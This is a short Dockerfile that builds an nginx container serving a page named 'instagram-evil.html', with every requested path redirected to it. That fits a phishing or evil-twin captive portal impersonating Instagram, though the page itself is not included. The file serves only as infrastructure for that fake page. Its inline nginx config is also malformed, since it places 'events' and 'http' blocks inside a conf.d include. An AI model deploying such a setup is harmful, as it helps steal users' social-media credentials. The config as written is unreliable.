FROM nginx:alpine
COPY instagram-evil.html /usr/share/nginx/html/
RUN echo 'events {} http { server { listen 80; location / { root /usr/share/nginx/html; try_files $uri /instagram-evil.html; add_header Strict-Transport-Security "max-age=31536000; preload"; } } }' > /etc/nginx/conf.d/default.conf
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]